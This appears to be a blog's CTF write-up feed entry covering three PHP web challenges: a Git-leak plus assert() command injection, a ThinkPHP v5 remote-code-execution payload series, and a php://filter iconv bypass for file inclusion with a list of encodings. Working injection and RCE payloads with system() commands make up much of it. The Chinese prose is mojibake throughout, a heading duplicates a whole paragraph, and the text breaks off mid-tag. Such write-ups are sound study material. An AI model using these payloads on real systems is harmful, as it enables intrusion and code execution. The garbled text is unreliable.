    <content type="html"><![CDATA[<p>åšé¢˜è®°å½•</p><span id="more"></span><hr><h2 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a><strong>mfw</strong></h2><p>è¿›å…¥ç¯å¢ƒ:<br><img src="/img/b5.png" alt="b5"><br>ç‚¹ä¸‹ä¸Šé¢çš„é“¾æ¥çœ‹çœ‹ç»“æœAboutï¼š<br><img src="/img/b6.png" alt="b6"><br>é‡Œé¢æœ‰ä¸ªGit,æƒ³åˆ°äº†Gitæ³„éœ²,ç›´æ¥çœ‹ä¸‹.gitæ–‡ä»¶æœ‰æ²¡æœ‰ï¼š<br><img src="/img/b7.png" alt="b7"><br>ä¸ŠGitHackï¼š<br><code>python GitHack.py http://61.147.171.105:55455/.git/</code><br><img src="/img/b8.png" alt="b8"><br>è®¿é—®ä¸€ä¸‹ï¼Œçœ‹æœ‰æ²¡æœ‰å•¥å¥½ä¸œè¥¿ï¼š<br>flag.phpé‡Œå•¥ä¹Ÿæ²¡æœ‰ï¼Œå¯æƒœï¼š<br><img src="/img/b9.png" alt="b9"><br>çœ‹ä¸‹index.php,é‡Œé¢æœ‰ä¸å°‘å¥½ä¸œè¥¿ï¼ŒæŠŠæœ‰ç”¨çš„phpéƒ¨åˆ†æ‹¿å‡ºæ¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>])) &#123;<br><span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$page</span> = <span class="hljs-string">&quot;home&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;templates/&quot;</span> . <span class="hljs-variable">$page</span> . <span class="hljs-string">&quot;.php&quot;</span>;<br><br><span class="hljs-comment">// I heard &#x27;..&#x27; is dangerous!</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;strpos(&#x27;<span class="hljs-subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Detected hacking attempt!&quot;</span>);<br><br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Make this look nice</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;file_exists(&#x27;<span class="hljs-subst">$file</span>&#x27;)&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;That file doesn&#x27;t exist!&quot;</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span> <span class="hljs-variable">$file</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>é¦–å…ˆGETæ–¹å¼ä¼ pageï¼Œä¸ç»™pageèµ‹å€¼çš„è¯è‡ªåŠ¨ç­‰äºhome(å°±æ˜¯æˆ‘ä»¬è¿›å»çœ‹åˆ°çš„é¦–é¡µ)ï¼Œç„¶åè¿›è¡Œä¸€ä¸ªæ‹¼æ¥ï¼štemplates&#x2F;$page.phpï¼ŒæŠŠè¿™ä¸œè¥¿ç»™$fileã€‚assertè¿™ä¸œè¥¿å«â€œæ–­è¨€æ£€æŸ¥â€ï¼Œæ„æ€æ˜¯å¦‚æœé‡Œé¢çš„æ¡ä»¶æ˜¯çœŸï¼Œå°±ä¼šæ¥ç€æ‰§è¡Œåé¢çš„å‡½æ•°require_onceï¼Œè¿™ä¸œè¥¿æœ‰ç‚¹ç‚¹åƒincludeåŒ…å«ï¼Œè‡³äºç›´æ¥åŒ…å«æŸä¸ªæ–‡ä»¶ï¼Œä¸ç”¨ä¼ªåè®®å•¥çš„æˆ‘ä¸€ç›´æŠŠå®ƒç†è§£æˆæ‰§è¡Œè¯¥æ–‡ä»¶ï¼Œå“ˆå“ˆã€‚<br>æ¥ä¸‹æ¥çš„æ€è·¯å°±æ˜¯æ„é€ pageè®©ä»–æ‰§è¡Œä¸€äº›å‘½ä»¤æ¯”å¦‚â€™lsâ€™ â€˜catâ€™å•¥çš„ã€‚<br>æ¥ä¸‹æ¥çš„payloadå‚è€ƒäº†è¿™ä½å¸ˆå‚…çš„æ–‡ç« ï¼Œæ„Ÿè°¢ï¼ï¼š<br><code>https://blog.csdn.net/m0_62063669/article/details/125427751?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169364331616800186574360%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169364331616800186574360&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-125427751-null-null.142^v93^koosearch_v1&amp;utm_term=mfw&amp;spm=1018.2226.3001.4187</code><br>payloaad:<br><code>index.php/?page=flag&#39;,&#39;abc&#39;) === false and system(&quot;cat templates/flag.php&quot;) and strops(&#39;flag</code><br>è§£é‡Šä¸‹ä¸ºä»€ä¹ˆè¦ç»™pageèµ‹è¿™ä¹ˆä¸€ä¸ªå€¼ï¼Œå…ˆçœ‹è¿™ä¸ªpageè®©fileæˆäº†ä¸ªå•¥ä¸œè¥¿ï¼š<br><code>file = template/flag&#39;,&#39;abc&#39;) === false and system(&quot;cat templates/flag.php&quot;) and strops(&#39;flag.php</code><br>å¸¦åˆ°æ–­è¨€å‡½æ•°ä¸­ï¼š<br><code>assert(&quot;strpos(&#39;template/flag&#39;,&#39;abc&#39;) === false and system(&quot;cat templates/flag.php&quot;) and strops(&#39;flag.php&#39;, &#39;..&#39;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);</code></p><p>strposå‡½æ•°æ˜¯çœ‹å‚æ•°é‡Œæœ‰æ²¡æœ‰è¦æ£€æµ‹çš„å€¼ï¼Œæœ‰çš„è¯è¿”å›ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œæ²¡æœ‰å°±è¿”å›falseã€‚æ˜æ˜¾ â€˜template&#x2F;flagâ€™è¿™é‡Œé¢æ²¡abcï¼Œç¬¬ä¸€ä¸ªassertä¸ºçœŸï¼›ç¬¬äºŒä¸ªæ‰§è¡Œ cat templates&#x2F;flag.php ï¼Œè¿™æ²¡å•¥å¥½è¯´çš„ï¼Œå°±æ˜¯å»æ‹¿æˆ‘ä»¬è¦çš„flagï¼Œä¸è¿‡æ³¨æ„catåçš„æ–‡ä»¶è·¯å¾„ã€‚æˆ‘ä»¬å½“å‰åœ¨index.phpä¸‹ï¼Œindex.phpå’ŒtemplatesåŒç›®å½•ï¼Œflag.phpåˆåœ¨templatesä¸‹ã€‚æ‰€ä»¥ç›¸å¯¹è·¯å¾„å°±æ˜¯<code>templates/flag.php</code>ã€‚æœ€åä¸€ä¸ªæ–­è¨€æ˜¯æ‰¾flag.phpä¸­æœ‰æ²¡æœ‰ä¿©ç‚¹ï¼Œæ²¡æœ‰è¿”å›falseã€‚å› ä¸ºæ˜¯ä¸¤ä¸ªandè¿æ¥ï¼Œä¸‰ä¸ªæ¡ä»¶éƒ½ä¸ºçœŸå³ä¸ºçœŸã€‚ç„¶åç›´æ¥require($file)ï¼Œæ‰§è¡Œå‘½ä»¤ã€‚<br>flagè—åœ¨æºç é‡Œï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902182614238-883024157.png" alt="image"></p><h2 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a><strong>php_rce</strong></h2><p>è¿›å…¥ç¯å¢ƒï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902193727121-429631782.png" alt="image"><br>Githubæœä¸‹æœ‰å…³è¿™ä¸ªThinkPHPV5çš„ç›¸å…³æ¼æ´ï¼Œå‘ç°æœ‰ä¸€å¤§å †è¿œç¨‹å‘½ä»¤æ‰§è¡Œçš„POCï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200111760-1487399677.png" alt="image"><br>æ‰¾ä¸ªé•¿çš„è¯•è¯•ï¼š<br><code>s=index/%5Cthink%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=phpinfo&amp;vars%5B1%5D%5B%5D=1</code><br>æ‰§è¡Œäº†phpinfo()è¿™ä¸ªå‘½ä»¤<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200144506-2129745043.png" alt="image"><br>lsçœ‹ä¸‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼š<br><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200315231-1913861343.png" alt="image"><br>æ²¡æœ‰å’Œflagæœ‰å…³çš„ä¸œè¥¿ï¼Œç­‰ä¼šç”¨findæ‰¾ä¸€ä¸‹ï¼Œä¸è¿‡è¿™é‡Œæœ‰ä¸ªå’Œçˆ¬è™«æœ‰å…³çš„robots.txtï¼Œè®©æˆ‘çœ‹çœ‹ä½ ï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200424907-1518032191.png" alt="image"><br>å¯æƒœå•¥ä¹Ÿæ²¡æœ‰ï¼Œfindå‘½ä»¤æ‰¾ä¸‹å’Œflagæœ‰å…³çš„ä¸œè¥¿ï¼š<br><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find /%20 -name &quot;flag*&quot;</code><br>findæ˜¯å…¨ç£ç›˜æŸ¥æ‰¾æ‰€ä»¥å¯èƒ½ä¼šæ¯”è¾ƒæ…¢ï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200658223-1816441800.png" alt="image"><br>è‰äº†ï¼Œè¿˜æ˜¯çœ‹çœ‹æ ¹ç›®å½•ä¸‹éƒ½å•¥ä¸œè¥¿å§ï¼š<br><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls /</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200800369-192377013.png" alt="image"><br>æœ‰ä¸ªflag: ls &#x2F;flagæ²¡å•¥æœ‰ä»·å€¼çš„ä¸œè¥¿ï¼Œç›´æ¥ cat &#x2F;flagè¯»ä¸€ä¸‹ï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902201445887-2027647501.png" alt="image"></p><h2 id="é¢˜ç›®åç§°-æ–‡ä»¶åŒ…å«"><a href="#é¢˜ç›®åç§°-æ–‡ä»¶åŒ…å«" class="headerlink" title="é¢˜ç›®åç§°-æ–‡ä»¶åŒ…å«"></a><strong>é¢˜ç›®åç§°-æ–‡ä»¶åŒ…å«</strong></h2><h2 id="è¿›å…¥ç¯å¢ƒï¼Œæœ´å®æ— åçš„ä¸€å°æ®µphpï¼Œç›´æ¥filterä¼ªåè®®è¯»flag-phpæºç ï¼šå›æ˜¾äº†dont-hackï¼ä¼°è®¡check-phpèµ·ä½œç”¨ç„¶åè§¦å‘ä»€ä¹ˆå…³é”®è¯äº†ã€‚ã€‚è¿™æ—¶å€™æƒ³åˆ°ä¹‹å‰åšè¿‡çš„ä¸€é“é¢˜ï¼šç”¨äº†convert-iconv-UTF-8-UCS-4BE-resource-check-phpè¿™ç§ç±»å‹çš„è¿‡æ»¤å™¨ï¼Œé‚£å°±è¯•è¯•è¿™ä¸ªï¼š-filename-php-filter-convert-iconv-UTF-8-UCS-4BE-resource-check-phpè¿‡æ»¤å™¨å¯¹äº†ä½†æ˜¯ç”¨æ³•ä¸å¯¹ï¼Œé‚£å¯èƒ½æ˜¯input-encodingå’Œoutput-encodingä¸å¯¹ã€‚ã€‚éœ€è¦ä¸€ä¸ªä¸€ä¸ªæ‰¾ã€‚ã€‚ä½†è¿™ç©æ„å¯ç”¨çš„ç¼–ç å®åœ¨å¤ªå¤šï¼šç›´æ¥å»ç¿»äº†wpã€‚ã€‚æ„Ÿè°¢è¿™ä½å¸ˆå‚…ï¼šhttps-blog-csdn-net-gsumall04-article-details-131807065-ops-request-misc-257B-2522request-255Fid-2522-253A-2522169373375216800222871982-2522-252C-2522scm-2522-253A-252220140713-130102334-2522-257D-request-id-169373375216800222871982-biz-id-0-utm-medium-distribute-pc-search-result-none-task-blog-2-all-top-positive-default-1-131807065-null-null-142-v93-koosearch-v1-utm-term-E9-A2-98-E7-9B-AE-E5-90-8D-E7-A7-B0-E6-96-87-E4-BB-B6-E5-8C-85-E5-90-AB-spm-1018-2226-3001-4187æˆ‘æ˜¯æ‡’ç‹—å°±ä¸ä¸€ä¸ªä¸€ä¸ªåŠ äº†ã€‚ã€‚ä¹Ÿä¸çŸ¥é“æœ‰æ²¡æœ‰ç¼–ç çš„å­—å…¸ï¼Œèƒ½æ–¹ä¾¿ä¸å°‘ã€‚æˆ‘æ”¾äº†4ç§ç†Ÿæ‚‰ä¸‹æ­¥éª¤ï¼šburpsuiteçš„intruderæ¨¡å—çˆ†ä¸€ä¸‹ï¼Œé€‰æ‹©é›†æŸç‚¸å¼¹æ¨¡å¼ï¼šæ ¹æ®é•¿åº¦æ’åˆ—ä¸€ä¸‹ï¼šæ‹¿åˆ°flagï¼šæœ€åè¯´ä¸‹ä¸ºä»€ä¹ˆè¦å»è¯»flag-phpè€Œä¸æ˜¯åˆ«çš„ï¼šä¸€æ˜¯å¾ˆå¤šflagéƒ½åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œï¼ŒäºŒæ˜¯ç›´æ¥è®¿é—®flag-phpæ—¶å®ƒå¹¶æ²¡ç»™æˆ‘ä»¬æŠ¥é”™-ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#è¿›å…¥ç¯å¢ƒï¼Œæœ´å®æ— åçš„ä¸€å°æ®µphpï¼Œç›´æ¥filterä¼ªåè®®è¯»flag-phpæºç ï¼šå›æ˜¾äº†dont-hackï¼ä¼°è®¡check-phpèµ·ä½œç”¨ç„¶åè§¦å‘ä»€ä¹ˆå…³é”®è¯äº†ã€‚ã€‚è¿™æ—¶å€™æƒ³åˆ°ä¹‹å‰åšè¿‡çš„ä¸€é“é¢˜ï¼šç”¨äº†convert-iconv-UTF-8-UCS-4BE-resource-check-phpè¿™ç§ç±»å‹çš„è¿‡æ»¤å™¨ï¼Œé‚£å°±è¯•è¯•è¿™ä¸ªï¼š-filename-php-filter-convert-iconv-UTF-8-UCS-4BE-resource-check-phpè¿‡æ»¤å™¨å¯¹äº†ä½†æ˜¯ç”¨æ³•ä¸å¯¹ï¼Œé‚£å¯èƒ½æ˜¯input-encodingå’Œoutput-encodingä¸å¯¹ã€‚ã€‚éœ€è¦ä¸€ä¸ªä¸€ä¸ªæ‰¾ã€‚ã€‚ä½†è¿™ç©æ„å¯ç”¨çš„ç¼–ç å®åœ¨å¤ªå¤šï¼šç›´æ¥å»ç¿»äº†wpã€‚ã€‚æ„Ÿè°¢è¿™ä½å¸ˆå‚…ï¼šhttps-blog-csdn-net-gsumall04-article-details-131807065-ops-request-misc-257B-2522request-255Fid-2522-253A-2522169373375216800222871982-2522-252C-2522scm-2522-253A-252220140713-130102334-2522-257D-request-id-169373375216800222871982-biz-id-0-utm-medium-distribute-pc-search-result-none-task-blog-2-all-top-positive-default-1-131807065-null-null-142-v93-koosearch-v1-utm-term-E9-A2-98-E7-9B-AE-E5-90-8D-E7-A7-B0-E6-96-87-E4-BB-B6-E5-8C-85-E5-90-AB-spm-1018-2226-3001-4187æˆ‘æ˜¯æ‡’ç‹—å°±ä¸ä¸€ä¸ªä¸€ä¸ªåŠ äº†ã€‚ã€‚ä¹Ÿä¸çŸ¥é“æœ‰æ²¡æœ‰ç¼–ç çš„å­—å…¸ï¼Œèƒ½æ–¹ä¾¿ä¸å°‘ã€‚æˆ‘æ”¾äº†4ç§ç†Ÿæ‚‰ä¸‹æ­¥éª¤ï¼šburpsuiteçš„intruderæ¨¡å—çˆ†ä¸€ä¸‹ï¼Œé€‰æ‹©é›†æŸç‚¸å¼¹æ¨¡å¼ï¼šæ ¹æ®é•¿åº¦æ’åˆ—ä¸€ä¸‹ï¼šæ‹¿åˆ°flagï¼šæœ€åè¯´ä¸‹ä¸ºä»€ä¹ˆè¦å»è¯»flag-phpè€Œä¸æ˜¯åˆ«çš„ï¼šä¸€æ˜¯å¾ˆå¤šflagéƒ½åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œï¼ŒäºŒæ˜¯ç›´æ¥è®¿é—®flag-phpæ—¶å®ƒå¹¶æ²¡ç»™æˆ‘ä»¬æŠ¥é”™-ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="è¿›å…¥ç¯å¢ƒï¼Œæœ´å®æ— åçš„ä¸€å°æ®µphpï¼Œç›´æ¥filterä¼ªåè®®è¯»flag.phpæºç ï¼šå›æ˜¾äº†dont hackï¼ä¼°è®¡check.phpèµ·ä½œç”¨ç„¶åè§¦å‘ä»€ä¹ˆå…³é”®è¯äº†ã€‚ã€‚è¿™æ—¶å€™æƒ³åˆ°ä¹‹å‰åšè¿‡çš„ä¸€é“é¢˜ï¼šç”¨äº†convert.iconv.UTF-8*.UCS-4BE.resource=./check.phpè¿™ç§ç±»å‹çš„è¿‡æ»¤å™¨ï¼Œé‚£å°±è¯•è¯•è¿™ä¸ªï¼š?filename=php://filter/convert.iconv.UTF-8*.UCS-4BE.resource=./check.phpè¿‡æ»¤å™¨å¯¹äº†ä½†æ˜¯ç”¨æ³•ä¸å¯¹ï¼Œé‚£å¯èƒ½æ˜¯input-encodingå’Œoutput-encodingä¸å¯¹ã€‚ã€‚éœ€è¦ä¸€ä¸ªä¸€ä¸ªæ‰¾ã€‚ã€‚ä½†è¿™ç©æ„å¯ç”¨çš„ç¼–ç å®åœ¨å¤ªå¤šï¼šç›´æ¥å»ç¿»äº†wpã€‚ã€‚æ„Ÿè°¢è¿™ä½å¸ˆå‚…ï¼šhttps://blog.csdn.net/gsumall04/article/details/131807065?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169373375216800222871982%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169373375216800222871982&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-131807065-null-null.142^v93^koosearch_v1&amp;utm_term=%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&amp;spm=1018.2226.3001.4187æˆ‘æ˜¯æ‡’ç‹—å°±ä¸ä¸€ä¸ªä¸€ä¸ªåŠ äº†ã€‚ã€‚ä¹Ÿä¸çŸ¥é“æœ‰æ²¡æœ‰ç¼–ç çš„å­—å…¸ï¼Œèƒ½æ–¹ä¾¿ä¸å°‘ã€‚æˆ‘æ”¾äº†4ç§ç†Ÿæ‚‰ä¸‹æ­¥éª¤ï¼šburpsuiteçš„intruderæ¨¡å—çˆ†ä¸€ä¸‹ï¼Œé€‰æ‹©é›†æŸç‚¸å¼¹æ¨¡å¼ï¼šæ ¹æ®é•¿åº¦æ’åˆ—ä¸€ä¸‹ï¼šæ‹¿åˆ°flagï¼šæœ€åè¯´ä¸‹ä¸ºä»€ä¹ˆè¦å»è¯»flag.phpè€Œä¸æ˜¯åˆ«çš„ï¼šä¸€æ˜¯å¾ˆå¤šflagéƒ½åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œï¼ŒäºŒæ˜¯ç›´æ¥è®¿é—®flag.phpæ—¶å®ƒå¹¶æ²¡ç»™æˆ‘ä»¬æŠ¥é”™:[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>è¿›å…¥ç¯å¢ƒï¼Œæœ´å®æ— åçš„ä¸€å°æ®µphpï¼Œç›´æ¥filterä¼ªåè®®è¯»flag.phpæºç ï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903180701730-2096930147.png" alt="image"><br>å›æ˜¾äº†dont hackï¼ä¼°è®¡check.phpèµ·ä½œç”¨ç„¶åè§¦å‘ä»€ä¹ˆå…³é”®è¯äº†ã€‚ã€‚è¿™æ—¶å€™æƒ³åˆ°ä¹‹å‰åšè¿‡çš„ä¸€é“é¢˜ï¼šç”¨äº†<br><code>convert.iconv.UTF-8*.UCS-4BE.resource=./check.php</code><br>è¿™ç§ç±»å‹çš„è¿‡æ»¤å™¨ï¼Œé‚£å°±è¯•è¯•è¿™ä¸ªï¼š<br><code>?filename=php://filter/convert.iconv.UTF-8*.UCS-4BE.resource=./check.php</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903180953978-745219457.png" alt="image"><br>è¿‡æ»¤å™¨å¯¹äº†ä½†æ˜¯ç”¨æ³•ä¸å¯¹ï¼Œé‚£å¯èƒ½æ˜¯input-encodingå’Œoutput-encodingä¸å¯¹ã€‚ã€‚éœ€è¦ä¸€ä¸ªä¸€ä¸ªæ‰¾ã€‚ã€‚ä½†è¿™ç©æ„å¯ç”¨çš„ç¼–ç å®åœ¨å¤ªå¤šï¼š<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>*<br>    <span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>BE<br>    <span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>LE*<br>    <span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span><br>    <span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>BE<br>    <span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>LE<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>BE*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>LE*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>BE*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>LE*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">7</span><br>    <span class="hljs-attribute">UTF7</span>-IMAP<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>*<br>    <span class="hljs-attribute">ASCII</span>*<br>    <span class="hljs-attribute">EUC</span>-JP*<br>    <span class="hljs-attribute">SJIS</span>*<br>    <span class="hljs-attribute">eucJP</span>-win*<br>    <span class="hljs-attribute">SJIS</span>-win*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MS<br>    <span class="hljs-attribute">CP932</span><br>    <span class="hljs-attribute">CP51932</span><br>    <span class="hljs-attribute">SJIS</span>-macï¼ˆåˆ«åï¼šMacJapaneseï¼‰<br>    <span class="hljs-attribute">SJIS</span>-Mobile#DOCOMOï¼ˆåˆ«åï¼šSJIS-DOCOMOï¼‰<br>    <span class="hljs-attribute">SJIS</span>-Mobile#KDDIï¼ˆåˆ«åï¼šSJIS-KDDIï¼‰<br>    <span class="hljs-attribute">SJIS</span>-Mobile#SOFTBANKï¼ˆåˆ«åï¼šSJIS-SOFTBANKï¼‰<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#DOCOMOï¼ˆåˆ«åï¼šUTF-<span class="hljs-number">8</span>-DOCOMOï¼‰<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#KDDI-A<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#KDDI-Bï¼ˆåˆ«åï¼šUTF-<span class="hljs-number">8</span>-KDDIï¼‰<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#SOFTBANKï¼ˆåˆ«åï¼šUTF-<span class="hljs-number">8</span>-SOFTBANKï¼‰<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MOBILE#KDDIï¼ˆåˆ«åï¼šISO-<span class="hljs-number">2022</span>-JP-KDDIï¼‰<br>    <span class="hljs-attribute">JIS</span><br>    <span class="hljs-attribute">JIS</span>-ms<br>    <span class="hljs-attribute">CP50220</span><br>    <span class="hljs-attribute">CP50220raw</span><br>    <span class="hljs-attribute">CP50221</span><br>    <span class="hljs-attribute">CP50222</span><br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">2</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">3</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">4</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">5</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">6</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">7</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">8</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">9</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">10</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">13</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">14</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">15</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">16</span>*<br>    <span class="hljs-attribute">byte2be</span><br>    <span class="hljs-attribute">byte2le</span><br>    <span class="hljs-attribute">byte4be</span><br>    <span class="hljs-attribute">byte4le</span><br>    <span class="hljs-attribute">BASE64</span><br>    <span class="hljs-attribute">HTML</span>-ENTITIESï¼ˆåˆ«åï¼šHTMLï¼‰<br>    <span class="hljs-attribute">7bit</span><br>    <span class="hljs-attribute">8bit</span><br>    <span class="hljs-attribute">EUC</span>-CN*<br>    <span class="hljs-attribute">CP936</span><br>    <span class="hljs-attribute">GB18030</span><br>    <span class="hljs-attribute">HZ</span><br>    <span class="hljs-attribute">EUC</span>-TW*<br>    <span class="hljs-attribute">CP950</span><br>    <span class="hljs-attribute">BIG</span>-<span class="hljs-number">5</span>*<br>    <span class="hljs-attribute">EUC</span>-KR*<br>    <span class="hljs-attribute">UHC</span>ï¼ˆåˆ«åï¼šCP949ï¼‰<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-KR<br>    <span class="hljs-attribute">Windows</span>-<span class="hljs-number">1251</span>ï¼ˆåˆ«åï¼šCP1251ï¼‰<br>    <span class="hljs-attribute">Windows</span>-<span class="hljs-number">1252</span>ï¼ˆåˆ«åï¼šCP1252ï¼‰<br>    <span class="hljs-attribute">CP866</span>ï¼ˆåˆ«åï¼šIBM866ï¼‰<br>    <span class="hljs-attribute">KOI8</span>-R*<br>    <span 